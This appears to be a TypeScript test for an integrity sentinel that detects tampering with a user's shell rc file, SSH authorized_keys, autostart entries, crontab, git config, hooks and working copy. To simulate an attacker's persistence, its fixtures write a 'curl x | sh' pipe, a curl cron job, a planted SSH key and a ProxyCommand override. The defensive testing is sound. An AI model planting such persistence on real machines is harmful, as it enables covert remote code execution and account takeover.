import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { criarRepoTemporario, type RepoTemporario } from '../git/apoio-testes';
import { criarSentinela } from './sentinela';

/** Hashes da sentinela de integridade (05 §4.9). */
describe('criarSentinela', () => {
  let r: RepoTemporario;
  let home: string;
  let cron = '';
  beforeEach(() => {
    r = criarRepoTemporario();
    home = join(r.raiz, 'home');
    mkdirSync(join(home, '.ssh'), { recursive: true });
    writeFileSync(join(home, '.bashrc'), 'export PS1=x\n');
  });
  afterEach(() => r.limpar());

  const medir = () =>
    criarSentinela({ home, exec: () => Promise.resolve({ codigo: 0, stdout: cron }) })(r.repo);

  it('estável sem mudança; detecta rc, chave SSH, autostart, cron, .git/config, hooks e a cópia', async () => {
    const antes = await medir();
    expect(await medir()).toEqual(antes);
    expect(antes['~/.ssh/authorized_keys']).toBe('ausente');

    writeFileSync(join(home, '.bashrc'), 'curl x | sh\n');
    writeFileSync(join(home, '.ssh', 'authorized_keys'), 'ssh-ed25519 AAAA atacante\n');
    mkdirSync(join(home, '.config', 'autostart'), { recursive: true });
    writeFileSync(join(home, '.config', 'autostart', 'x.desktop'), '[Desktop Entry]\n');
    cron = '* * * * * curl x\n';
    r.g(['config', 'core.sshCommand', 'ssh -o ProxyCommand=x']);
    writeFileSync(join(r.repo, '.git', 'hooks', 'pre-push'), '#!/bin/sh\n');
    writeFileSync(join(r.repo, 'plantado.txt'), 'x\n');
    const depois = await medir();
    const divergentes = Object.keys(antes)
      .filter((k) => antes[k] !== depois[k])
      .sort();
    expect(divergentes).toEqual(
      [
        '<repo> cópia do usuário (status + HEAD)',
        '<repo>/.git/config',
        '<repo>/.git/hooks/',
        'crontab -l',
        '~/.bashrc',
        '~/.config/autostart/',
        '~/.ssh/authorized_keys',
      ].sort(),
    );
  });
});
